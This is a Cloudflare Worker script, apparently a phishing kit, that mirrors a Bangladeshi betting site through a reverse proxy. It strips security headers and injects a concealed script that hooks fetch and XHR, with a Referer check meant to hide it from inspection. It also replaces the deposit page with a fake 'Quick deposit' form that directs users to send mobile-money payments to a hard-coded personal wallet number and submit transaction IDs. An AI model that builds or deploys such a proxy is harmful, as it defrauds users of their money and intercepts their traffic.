export default {
  async fetch(request, env, ctx) {
    // ==========================================
    // ⚙️ ইউজার কনফিগারেশন সেকশন
    // ==========================================
    
    const TARGET_DOMAIN = env.TARGET_URL || "https://www.baji11.live";
    const API_DOMAINS = ["liveapi247.live"]; 
    const MEDIA_AND_SCORE_DOMAINS =["tv.nginx0.com"]; 
    
    const ALL_TARGETS =[...API_DOMAINS, ...MEDIA_AND_SCORE_DOMAINS]; 
    const url = new URL(request.url);
    const originHeader = request.headers.get("Origin") || `https://${url.host}`;

    // 🛡️ প্রফেশনাল সিকিউরিটি: Ghost Script Route
    if (url.pathname === '/__secure_core.js') {
        const referer = request.headers.get("Referer");
        if (!referer || !referer.includes(url.hostname)) {
            return new Response(`console.log("Access Denied");`, {
                status: 200, headers: { "Content-Type": "application/javascript" }
            });
        }
        const secretCode = `!function(){const r="/__api_proxy/",e=["liveapi247.live","tv.nginx0.com"];function t(r){return"string"==typeof r&&!r.includes("__api_proxy")&&e.some((e=>r.includes(e)))}const n=window.fetch;window.fetch=async function(...e){try{let o=e[0];"string"==typeof o&&t(o)?e[0]=r+o:o instanceof Request&&t(o.url)&&(e[0]=new Request(r+o.url,o))}catch(r){}return n.apply(this,e)};const o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(e,n,...c){try{"string"==typeof n&&t(n)&&(n=r+n)}catch(r){}return o.call(this,e,n,...c)}}();`;
        return new Response(secretCode, {
            status: 200, headers: { "Content-Type": "application/javascript", "Cache-Control": "no-cache, no-store, must-revalidate" }
        });
    }

    // ১. CORS প্রিফ্লাইট
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": originHeader,
          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS, PATCH",
          "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers") || "*",
          "Access-Control-Allow-Credentials": "true",
          "Access-Control-Max-Age": "86400",
        }
      });
    }

    // ২. API এবং Video Stream (m3u8/ts) প্রক্সি
    if (url.pathname.startsWith('/__api_proxy/')) {
      let actualApiUrl = request.url.substring(request.url.indexOf('/__api_proxy/') + 13);
      if (!actualApiUrl.startsWith('http')) actualApiUrl = 'https://' + actualApiUrl;
      try {
        const targetApi = new URL(actualApiUrl);
        const apiReq = new Request(targetApi.toString(), request);
        apiReq.headers.set("Host", targetApi.host);
        apiReq.headers.set("Origin", TARGET_DOMAIN);
        apiReq.headers.set("Referer", TARGET_DOMAIN + "/");

        const apiRes = await fetch(apiReq);
        let newApiRes;
        const contentType = apiRes.headers.get("content-type") || "";
        
        if (contentType.includes("mpegurl") || contentType.includes("m3u8") || url.pathname.endsWith(".m3u8")) {
            let m3u8Text = await apiRes.text();
            const proxyPrefix = `https://${url.host}/__api_proxy/`;
            ALL_TARGETS.forEach(api => { m3u8Text = m3u8Text.replaceAll(`https://${api}`, `${proxyPrefix}https://${api}`); });
            const modHeaders = new Headers(apiRes.headers);
            modHeaders.delete("content-length"); 
            newApiRes = new Response(m3u8Text, { status: apiRes.status, statusText: apiRes.statusText, headers: modHeaders });
        } else {
            newApiRes = new Response(apiRes.body, apiRes);
        }
        
        const finalHeaders = new Headers(newApiRes.headers);
        finalHeaders.set("Access-Control-Allow-Origin", originHeader);
        finalHeaders.set("Access-Control-Allow-Credentials", "true");
        return new Response(newApiRes.body, { status: newApiRes.status, statusText: newApiRes.statusText, headers: finalHeaders });
      } catch (e) {
        return new Response(JSON.stringify({ error: "Proxy Error" }), { status: 500 });
      }
    }

    // ৩. মেইন ওয়েবসাইট লোড করা
    const target = new URL(TARGET_DOMAIN);
    target.pathname = url.pathname;
    target.search = url.search;
    const proxyRequest = new Request(target.toString(), request);
    proxyRequest.headers.set("Host", target.hostname);
    proxyRequest.headers.set("Origin", target.origin);
    proxyRequest.headers.set("Referer", target.origin);
    proxyRequest.headers.delete("Accept-Encoding"); 

    try {
      const response = await fetch(proxyRequest);
      const contentType = response.headers.get("content-type") || "";
      let responseBody;
      const newResponseHeaders = new Headers(response.headers);

      if (contentType.includes("text/html") || contentType.includes("application/javascript") || contentType.includes("text/javascript")) {
        let text = await response.text();
        const proxyPrefix = `https://${url.host}/__api_proxy/`;
        
        MEDIA_AND_SCORE_DOMAINS.forEach(api => {
            const originalUrl = `https://${api}`;
            const proxyUrl = `${proxyPrefix}${originalUrl}`;
            text = text.replaceAll(originalUrl, proxyUrl);
            text = text.replaceAll(originalUrl.replace(/\//g, '\\/'), proxyUrl.replace(/\//g, '\\/'));
        });

        if (contentType.includes("text/html") || contentType.includes("application/javascript")) {
            
            const banner1_New = "https://i.postimg.cc/d05XnH5B/20260414-035715.webp";
            const banner1_NewEsc = banner1_New.replace(/\//g, '\\/'); 
            
            const banner2_New = "https://i.postimg.cc/Jz7r6g1k/20260414-041553.webp";
            const banner2_NewEsc = banner2_New.replace(/\//g, '\\/');

            text = text.replaceAll("/pub-images/maza365/banner/banner-first-d.jpg", banner1_New);
            text = text.replaceAll("\\/pub-images\\/maza365\\/banner\\/banner-first-d.jpg", banner1_NewEsc);

            text = text.replaceAll("/pub-images/maza365/banner/banner10.jpg", banner2_New);
            text = text.replaceAll("\\/pub-images\\/maza365\\/banner\\/banner10.jpg", banner2_NewEsc);

            if (contentType.includes("text/html")) {
                const customStylesAndScripts = `
                <link rel="preload" href="https://github.com/user-attachments/assets/2e0caaaf-d0b6-4631-827f-4b428c62bc97" as="video" type="video/mp4" fetchpriority="high">
                <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">

                <style>
                  /* 📱 অ্যাপ ইন্সটল ব্যানার ডিজাইন */
                  #custom-install-banner {
                      width: 100%; background-color: #1a1a1a; color: white; display: none; align-items: center; 
                      padding: 10px 15px; box-sizing: border-box; font-family: Arial, sans-serif;
                      border-bottom: 1px solid #333; z-index: 9999999; position: relative; 
                  }
                  .cib-close { display: flex; align-items: center; justify-content: center; padding: 5px; cursor: pointer; margin-right: 10px; margin-left: -5px; }
                  .cib-logo { width: 38px; height: 38px; border-radius: 8px; margin-right: 12px; object-fit: contain; background: transparent; }
                  .cib-text { flex-grow: 1; display: flex; flex-direction: column; justify-content: center; }
                  .cib-title { font-weight: 700; font-size: 15px; margin: 0 0 2px 0; color: #ffffff; line-height: 1; }
                  .cib-desc { font-size: 12px; color: #cccccc; margin: 0; line-height: 1.2; }
                  .cib-install-btn {
                      background-color: #E53935; color: #ffffff; border: none; border-radius: 4px; padding: 7px 16px;
                      font-weight: 800; font-size: 14px; cursor: pointer; margin-left: 10px;
                  }

                  img[src*="banner-first-d.jpg"], img[alt*="banner-first-d.jpg"] { content: url("${banner1_New}") !important; object-fit: cover !important; }
                  img[src*="banner10.jpg"], img[alt*="banner10.jpg"] { content: url("${banner2_New}") !important; object-fit: cover !important; }
                  .css-blq8bd { display: none !important; }

                  .page-signup body, .page-login body { background-color: #121212 !important; }
                  .page-signup .chakra-form-control .chakra-input-group, .page-login .chakra-form-control .chakra-input-group { background-color: transparent !important; border: none !important; }
                  .page-signup .chakra-input, .page-login .chakra-input { height: 45px !important; background-color: #2c2c2c !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #ffffff !important; }
                  .page-signup .chakra-input::placeholder, .page-login .chakra-input::placeholder { color: #808080 !important; }
                  .page-login button.css-1u9t1b5, .page-login .css-1u9t1b5 { display: none !important; }
                  
                  /* ========================================================
                     🎯 BAJI999 QUICK DEPOSIT THEME (PRO UI) 
                     ======================================================== */
                  body.page-dw #root { display: none !important; }
                  body.page-dw { background-color: #111111 !important; }
                  
                  #b999-app {
                      display: none; 
                      --bg-main: #17181b; 
                      --bg-card: #222328; 
                      --primary: #12b984; 
                      --text-main: #ffffff;
                      --text-sub: #8c8c8c;
                      --border: #33353b;
                      
                      position: absolute; top: 0; left: 0; width: 100%; min-height: 100vh;
                      background-color: var(--bg-main); color: var(--text-main);
                      z-index: 9999999; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                      padding-bottom: 90px;
                  }
                  
                  body.page-dw #b999-app { display: block !important; }
                  #b999-app * { box-sizing: border-box; }

                  .b9-header {
                      display: flex; align-items: center; padding: 15px; 
                      background-color: var(--bg-main); position: sticky; top: 0; z-index: 10;
                      border-bottom: 1px solid var(--border);
                  }
                  .b9-header button { background: none; border: none; color: white; font-size: 20px; cursor: pointer; padding-right: 15px; }
                  .b9-header h2 { font-size: 18px; font-weight: 600; margin: 0; }

                  .b9-container { padding: 15px; }
                  .b9-label { font-size: 13px; color: var(--text-sub); margin-bottom: 10px; display: block; }
                  
                  /* Payment Grid */
                  .b9-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 25px; }
                  .b9-card { 
                      background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; 
                      padding: 12px 5px; text-align: center; cursor: pointer; transition: 0.2s;
                      display: flex; flex-direction: column; align-items: center; justify-content: center;
                  }
                  .b9-card img { width: 28px; height: 28px; object-fit: contain; margin-bottom: 8px; border-radius: 4px;}
                  .b9-card span { font-size: 13px; color: var(--text-main); }
                  .b9-card.active { border-color: var(--primary); background: rgba(18, 185, 132, 0.05); }
                  
                  /* Channel List */
                  .b9-channel-list { background: var(--bg-card); border-radius: 8px; border: 1px solid var(--border); margin-bottom: 25px; overflow: hidden; }
                  .b9-channel-item { 
                      display: flex; justify-content: space-between; align-items: center; 
                      padding: 16px 15px; cursor: pointer; border-bottom: 1px solid var(--border);
                  }
                  .b9-channel-item:last-child { border-bottom: none; }
                  .b9-channel-item.active { border: 1px solid var(--primary); border-radius: 8px; margin: -1px; position: relative; z-index: 2;}
                  .b9-ch-name { font-size: 14px; color: var(--text-main); }
                  .b9-radio { width: 18px; height: 18px; border-radius: 50%; border: 2px solid #555; display: flex; align-items: center; justify-content: center; }
                  .b9-channel-item.active .b9-radio { border-color: var(--primary); }
                  .b9-channel-item.active .b9-radio::after { content: ''; width: 10px; height: 10px; background: var(--primary); border-radius: 50%; }
                  .b9-recommend { background: rgba(18, 185, 132, 0.1); color: var(--primary); font-size: 11px; padding: 2px 6px; border-radius: 4px; margin-right: 10px; }

                  /* Amount Input */
                  .b9-amount-wrap { background: var(--bg-card); border-radius: 8px; border: 1px solid var(--border); padding: 15px; display: flex; align-items: center; margin-bottom: 25px; }
                  .b9-bdt-icon { background: var(--primary); color: #000; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; margin-right: 8px; }
                  .b9-amount-wrap span.bdt-text { color: var(--text-main); font-size: 15px; margin-right: 15px; }
                  .b9-amount-wrap input { flex: 1; background: transparent; border: none; color: var(--text-main); font-size: 20px; font-weight: 500; outline: none; text-align: right; }
                  .b9-clear { background: #444; color: #fff; width: 16px; height: 16px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; margin-left: 10px; cursor: pointer; }

                  /* Reminder */
                  .b9-reminder { background: var(--bg-card); border-radius: 8px; border: 1px solid var(--border); padding: 15px; margin-bottom: 25px; }
                  .b9-rem-head { display: flex; align-items: center; gap: 8px; font-size: 14px; margin-bottom: 10px; }
                  .b9-rem-text { font-size: 12px; color: var(--text-sub); line-height: 1.6; }

                  /* Footer Button */
                  .b9-footer { position: fixed; bottom: 0; left: 0; width: 100%; padding: 15px; background: var(--bg-main); border-top: 1px solid var(--border); z-index: 100;}
                  .b9-btn { width: 100%; background: var(--primary); color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 4px; cursor: pointer; }
                  .b9-btn:active { opacity: 0.8; }

                  /* Step 2 specific */
                  #b999-step2 { display: none; }
                  .b9-info-box { background: var(--bg-card); border-radius: 8px; border: 1px solid var(--primary); padding: 15px; margin-bottom: 20px; border-left: 4px solid var(--primary); }
                  .b9-copy-wrap { display: flex; align-items: center; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 12px 15px; margin-bottom: 25px; }
                  .b9-copy-wrap .num { flex: 1; font-size: 18px; font-weight: bold; color: var(--primary); letter-spacing: 1px; }
                  .b9-copy-wrap button { background: rgba(18, 185, 132, 0.1); color: var(--primary); border: 1px solid var(--primary); padding: 6px 12px; border-radius: 4px; font-size: 13px; cursor: pointer; }
                  
                  .b9-input-box { width: 100%; background: var(--bg-card); border: 1px solid var(--border); color: white; padding: 15px; border-radius: 8px; font-size: 15px; outline: none; margin-bottom: 20px; transition: 0.3s;}
                  .b9-input-box:focus { border-color: var(--primary); }
                  
                  /* Toast */
                  #b9-toast { visibility: hidden; min-width: 200px; background-color: var(--primary); color: #fff; text-align: center; border-radius: 4px; padding: 12px; position: fixed; z-index: 1000; left: 50%; bottom: 80px; transform: translateX(-50%); font-size: 14px; opacity: 0; transition: 0.3s; }
                  #b9-toast.show { visibility: visible; opacity: 1; bottom: 100px; }
                </style>

                <script>
                  (function(){
                    // =====================================
                    // ⚙️ PWA & General Logic
                    // =====================================
                    let deferredPrompt;
                    window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; });

                    function updateBodyClass() {
                        document.body.className = document.body.className.replace(/\\bpage-[^ ]*[ ]?\\b/g, '');
                        let path = window.location.pathname.replace(/\\//g, '');
                        if(path === '') path = 'home';
                        let basePage = path.split('?')[0]; 
                        document.body.classList.add('page-' + basePage);
                    }

                    let lastUrl = location.href; 
                    const urlObserver = new MutationObserver(() => {
                      if (location.href !== lastUrl) { lastUrl = location.href; updateBodyClass(); }
                    });

                    const b1 = '${banner1_New}';
                    const b2 = '${banner2_New}';
                    setInterval(() => {
                        document.querySelectorAll('img').forEach(img => {
                            let src = img.getAttribute('src') || ''; let alt = img.getAttribute('alt') || '';
                            if (src.includes('banner-first-d.jpg') || alt.includes('banner-first-d.jpg')) {
                                if (img.getAttribute('src') !== b1) { img.src = b1; img.setAttribute('src', b1); }
                            }
                        });
                    }, 100);

                    const domObserver = new MutationObserver(() => {
                        let fullPath = window.location.pathname.replace(/\\//g, '');
                        let currentPath = fullPath.split('?')[0]; 
                    });

                    // =====================================
                    // 🚀 Baji999 Quick Deposit UI & Logic
                    // =====================================
                    function initBaji999DW() {
                        if(document.getElementById('b999-app')) return;

                        // Icons for methods (using generic font-awesome colored appropriately)
                        const bKashIcon = '<i class="fa-solid fa-b" style="color:#e2136e; font-size:24px; margin-bottom:8px;"></i>';
                        const nagadIcon = '<i class="fa-solid fa-n" style="color:#f7931e; font-size:24px; margin-bottom:8px;"></i>';
                        const rocketIcon = '<i class="fa-solid fa-rocket" style="color:#8c1596; font-size:24px; margin-bottom:8px;"></i>';
                        const upayIcon = '<i class="fa-solid fa-u" style="color:#007bff; font-size:24px; margin-bottom:8px;"></i>';

                        const dwHTML = \`
                        <div id="b9-toast">Copied successfully!</div>
                        <div id="b999-app">
                            
                            <div id="b999-step1">
                                <div class="b9-header">
                                    <button onclick="window.location.href='/'"><i class="fa-solid fa-angle-left"></i></button>
                                    <h2>Quick deposit</h2>
                                </div>
                                
                                <div class="b9-container">
                                    <span class="b9-label">Select payment</span>
                                    <div class="b9-grid">
                                        <div class="b9-card active" data-method="bkash">
                                            \${bKashIcon} <span>bkash</span>
                                        </div>
                                        <div class="b9-card" data-method="Nagad">
                                            \${nagadIcon} <span>Nagad</span>
                                        </div>
                                        <div class="b9-card" data-method="Rocket">
                                            \${rocketIcon} <span>Rocket</span>
                                        </div>
                                        <div class="b9-card" data-method="UPay">
                                            \${upayIcon} <span>UPay</span>
                                        </div>
                                    </div>

                                    <span class="b9-label">Deposit channel</span>
                                    <div class="b9-channel-list">
                                        <div class="b9-channel-item active" data-channel="SG-Cashout">
                                            <span class="b9-ch-name">SG-Cashout</span>
                                            <div style="display:flex; align-items:center;">
                                                <span class="b9-recommend">Recommend</span>
                                                <div class="b9-radio"></div>
                                            </div>
                                        </div>
                                        <div class="b9-channel-item" data-channel="TM-CashOut">
                                            <span class="b9-ch-name">TM-CashOut</span>
                                            <div class="b9-radio"></div>
                                        </div>
                                        <div class="b9-channel-item" data-channel="Send Money">
                                            <span class="b9-ch-name">Send Money</span>
                                            <div class="b9-radio"></div>
                                        </div>
                                    </div>

                                    <span class="b9-label">Available balance ৳ 100.00-৳ 30,000.00</span>
                                    <div class="b9-amount-wrap">
                                        <div class="b9-bdt-icon">৳</div>
                                        <span class="bdt-text">BDT</span>
                                        <input type="number" id="b9-amount" placeholder="0" value="500">
                                        <div class="b9-clear" onclick="document.getElementById('b9-amount').value=''"><i class="fa-solid fa-times"></i></div>
                                    </div>

                                    <div class="b9-reminder">
                                        <div class="b9-rem-head">
                                            <i class="fa-solid fa-circle-info"></i> <strong>Reminder</strong>
                                        </div>
                                        <div class="b9-rem-text">
                                            Dear all member, to speed up your deposit process, kindly follow these steps:<br>
                                            1. Kindly make a Cash Out / Send Money to the number provided in the next step.<br>
                                            2. Input the Transaction ID.<br>
                                            3. Minimum DP is 100tk.<br><br>
                                            Reminder: Please only make deposits to the account instantly displayed while submitting the deposit.
                                        </div>
                                    </div>
                                </div>

                                <div class="b9-footer">
                                    <button class="b9-btn" onclick="window.b9NextStep()">Submit</button>
                                </div>
                            </div>

                            <div id="b999-step2">
                                <div class="b9-header">
                                    <button onclick="window.b9PrevStep()"><i class="fa-solid fa-angle-left"></i></button>
                                    <h2>Payment Details</h2>
                                </div>
                                
                                <div class="b9-container">
                                    <div class="b9-info-box">
                                        <div style="font-size:13px; color:var(--text-sub); margin-bottom:5px;">Deposit Amount</div>
                                        <div style="font-size:24px; font-weight:bold; color:var(--text-main);">
                                            BDT <span id="b9-disp-amount">0</span>
                                        </div>
                                        <div style="font-size:13px; color:var(--primary); margin-top:8px;" id="b9-disp-method">
                                            bkash (SG-Cashout)
                                        </div>
                                    </div>

                                    <span class="b9-label">Send money to this Wallet Number</span>
                                    <div class="b9-copy-wrap">
                                        <span class="num" id="b9-wallet-number">01773570463</span>
                                        <button onclick="window.b9Copy()"><i class="fa-regular fa-copy"></i> Copy</button>
                                    </div>

                                    <span class="b9-label">Transaction ID (Required)</span>
                                    <input type="text" id="b9-trxid" class="b9-input-box" placeholder="Enter 10-digit TrxID here">
                                    
                                    <span class="b9-label">Upload Receipt (Optional)</span>
                                    <input type="file" id="b9-receipt" class="b9-input-box" style="padding:10px; background:var(--bg-card);" accept="image/*">
                                </div>

                                <div class="b9-footer">
                                    <button class="b9-btn" id="b9-final-submit" onclick="window.b9SubmitApi()">Confirm Deposit</button>
                                </div>
                            </div>

                        </div>\`;
                        
                        document.body.insertAdjacentHTML('beforeend', dwHTML);
                        attachB9Listeners();
                    }

                    window.b9SelectedMethod = 'bkash';
                    window.b9SelectedChannel = 'SG-Cashout';

                    function attachB9Listeners() {
                        const methods = document.querySelectorAll('.b9-card');
                        methods.forEach(card => {
                            card.addEventListener('click', () => {
                                methods.forEach(c => c.classList.remove('active'));
                                card.classList.add('active');
                                window.b9SelectedMethod = card.getAttribute('data-method');
                            });
                        });

                        const channels = document.querySelectorAll('.b9-channel-item');
                        channels.forEach(ch => {
                            ch.addEventListener('click', () => {
                                channels.forEach(c => c.classList.remove('active'));
                                ch.classList.add('active');
                                window.b9SelectedChannel = ch.getAttribute('data-channel');
                            });
                        });
                    }

                    window.b9NextStep = function() {
                        const amount = document.getElementById('b9-amount').value;
                        if(!amount || amount < 100) { alert("Please enter a valid amount (Min 100)."); return; }
                        
                        document.getElementById('b9-disp-amount').innerText = amount;
                        document.getElementById('b9-disp-method').innerText = window.b9SelectedMethod + ' (' + window.b9SelectedChannel + ')';
                        
                        // এডমিন প্যানেল থেকে পাওয়া নাম্বার এখানে বসবে
                        // document.getElementById('b9-wallet-number').innerText = '01773570463';

                        document.getElementById('b999-step1').style.display = 'none';
                        window.scrollTo(0, 0);
                        document.getElementById('b999-step2').style.display = 'block';
                    };

                    window.b9PrevStep = function() {
                        document.getElementById('b999-step2').style.display = 'none';
                        document.getElementById('b999-step1').style.display = 'block';
                    };

                    window.b9Copy = function() {
                        const num = document.getElementById('b9-wallet-number').innerText;
                        navigator.clipboard.writeText(num).then(() => {
                            const toast = document.getElementById("b9-toast");
                            toast.className = "show";
                            setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 3000);
                        });
                    };

                    // =====================================
                    // 📡 Final API Submission
                    // =====================================
                    window.b9SubmitApi = async function() {
                        const trxId = document.getElementById('b9-trxid').value;
                        const amount = document.getElementById('b9-amount').value;
                        const receiptFile = document.getElementById('b9-receipt').files[0];
                        
                        if(!trxId) { alert("Transaction ID is required!"); return; }

                        const submitBtn = document.getElementById('b9-final-submit');
                        const originalText = submitBtn.innerText;
                        submitBtn.innerText = "Processing...";
                        submitBtn.disabled = true;

                        try {
                            const formData = new FormData();
                            formData.append('amount', amount);
                            // Method এর সাথে Channel যুক্ত করে দিচ্ছি যাতে এডমিন প্যানেলে ক্লিয়ার বোঝা যায়
                            formData.append('method', window.b9SelectedMethod + ' ' + window.b9SelectedChannel);
                            formData.append('transaction_id', trxId);
                            if(receiptFile) formData.append('receipt', receiptFile);

                            const response = await fetch('/__api_proxy/https://liveapi247.live/apiv9/deposit', {
                                method: 'POST',
                                headers: { 'Accept': 'application/json' },
                                body: formData
                            });

                            const result = await response.json();
                            if(result.status === true) {
                                alert("Success: " + result.msg);
                                document.getElementById('b9-trxid').value = '';
                                document.getElementById('b9-receipt').value = '';
                                window.b9PrevStep(); 
                            } else {
                                alert("Failed: " + (result.msg || "Transaction could not be completed."));
                            }
                        } catch (error) {
                            alert("Connection error! Please try again.");
                        } finally {
                            submitBtn.innerText = originalText;
                            submitBtn.disabled = false;
                        }
                    };

                    window.addEventListener('load', () => {
                        updateBodyClass(); 
                        initBaji999DW(); // Inject Baji999 Quick Deposit UI
                        urlObserver.observe(document, {subtree: true, childList: true});
                        domObserver.observe(document.body, { childList: true, subtree: true });
                    });
                  })();
                </script>`;

                const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
                if (text.includes('<head>')) {
                  text = text.replace('<head>', '<head>' + ghostScriptTag + customStylesAndScripts);
                } else {
                  text = ghostScriptTag + customStylesAndScripts + text;
                }
            }
        }
        
        responseBody = text;
        newResponseHeaders.delete("content-length"); 
        newResponseHeaders.set("Cache-Control", "no-cache, no-store, must-revalidate");
      } else {
        responseBody = response.body;
      }

      newResponseHeaders.delete("Content-Security-Policy");
      newResponseHeaders.delete("X-Frame-Options");
      newResponseHeaders.set("Access-Control-Allow-Origin", originHeader);
      
      return new Response(responseBody, {
        status: response.status,
        statusText: response.statusText,
        headers: newResponseHeaders
      });
    } catch (error) {
      return new Response("System Error", { status: 500 });
    }
  }
};
